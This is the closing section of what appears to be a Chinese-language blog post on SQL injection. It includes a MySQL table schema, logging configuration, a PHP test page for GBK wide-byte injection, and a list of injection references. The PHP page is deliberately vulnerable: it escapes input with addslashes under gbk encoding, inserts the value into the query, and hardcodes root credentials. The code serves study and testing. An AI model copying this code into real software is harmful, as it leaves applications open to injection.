| Table | Create Table                       
| users | CREATE TABLE `users` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `password` varchar(20) NOT NULL,
  `age` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=gbk |
```
### MySQL 文件权限
```
ysql> show global variables like '%secure%';
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_file_priv         | NULL  |
+--------------------------+-------+
```

### 开启MySQL日志
首先查看当前配置：
```
show variables like '%general%';
+------------------+--------------------------+
| Variable_name    | Value                    |
+------------------+--------------------------+
| general_log      | ON                       |
| general_log_file | /var/lib/mysql/query.log |
+------------------+--------------------------+
```
可以使用 `SET` 设置，也可以修改配置文件永久修改：
```
 vim /etc/mysql/my.cnf
//在 [mysqld] 后面添加
general_log_file = /var/log/mysql/query.log
general_log      = on
```
重启数据库

### 宽字节测试源码
```
<?php
//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去
$conn = mysql_connect('localhost', 'root', 'toor!@#$') or die('bad!');
mysql_query("SET NAMES 'gbk'");
mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");
//执行sql语句
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="gbk" />
<title>新闻</title>
</head>
<body>
<?php
$row = mysql_fetch_array($result, MYSQL_ASSOC);
echo "<h2>{$row['title']}</h2><p>{$row['content']}<p>\n";
mysql_free_result($result);
?>
</body>
</html>
```

### MySQL连接查询
&#8195;&#8195;顺便贴一下连接查询的图：
![sqljoin](/imgs/sqljoin.png)

## 参考
[四大行、城商行等银行都在使用什么数据库？](http://tech.it168.com/a2017/1025/3176/000003176147.shtml)
[对DB2数据库的注入](http://www.weixianmanbu.com/article/1687.html)
[通过sqli-labs学习sql注入——基础挑战之less1-10](https://blog.csdn.net/u012763794/article/details/51207833)
[SQL中的单引号和双引号有区别吗？](https://segmentfault.com/q/1010000000236690/a-1020000009134942)
[MySQL中字符串与数字比较的坑之二](https://blog.csdn.net/thekenofDIS/article/details/75011004)
[Mysql报错注入原理分析(count()、rand()、group by)](https://www.cnblogs.com/xdans/p/5412468.html)
[详解SQL盲注测试高级技巧](https://www.freebuf.com/articles/web/30841.html)
[Subquery's rand() column re-evaluated for every repeated selection in MySQL 5.7/8.0 vs MySQL 5.6](https://stackoverflow.com/questions/44336391/subquerys-rand-column-re-evaluated-for-every-repeated-selection-in-mysql-5-7)
[XML Functions](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue)
[MySQL时间盲注五种延时方法 (PWNHUB 非预期解)](https://www.cdxy.me/?p=789)
[GBK (character encoding)](https://en.wikipedia.org/wiki/GBK_(character_encoding))
[浅析白盒审计中的字符编码及SQL注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)
[深入理解SET NAMES和mysql(i)_set_charset的区别](http://www.laruence.com/2010/04/12/1396.html)
[由Three Hit聊聊二次注入](https://www.freebuf.com/articles/web/167089.html)

[【SQL注入】Mysql Order by注入](http://vinc.top/2016/06/20/mysql-order-by-后注入/)
[【SQL注入】mysql limit 注入](http://vinc.top/2017/04/01/【sql注入】mysql-limit-注入/)
[再谈Mysql中limit后的注入](http://www.vuln.cn/8101)

[SQL和NoSQL注入浅析（上）](https://xz.aliyun.com/t/2075)
[SQL和NoSQL注入浅析（下）](http://liehu.tass.com.cn/archives/1294)
[冷门知识 — NoSQL注入知多少](https://www.anquanke.com/post/id/97211)
[一个有趣的实例让NoSQL注入不再神秘](https://www.freebuf.com/articles/database/95314.html)
[NoSQL注入的分析和缓解](http://www.yunweipai.com/archives/14084.html)
[NoSQL Injection in MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb)
[HACKING NODEJS AND MONGODB](https://www.anquanke.com/post/id/97211)
[PHP Manaul for MongoDB: Script Injection Attacks](http://docs.php.net/manual/en/mongodb.security.script_injection.php)
[No SQL! no injection? A talk on the state of NoSQL security](https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf)

[MySQL automatically cast/convert a string to a number?](https://stackoverflow.com/questions/21762075/mysql-automatically-cast-convert-a-string-to-a-number)
[MySQL的学习--join和union的用法](https://www.cnblogs.com/CraryPrimitiveMan/p/3665154.html)
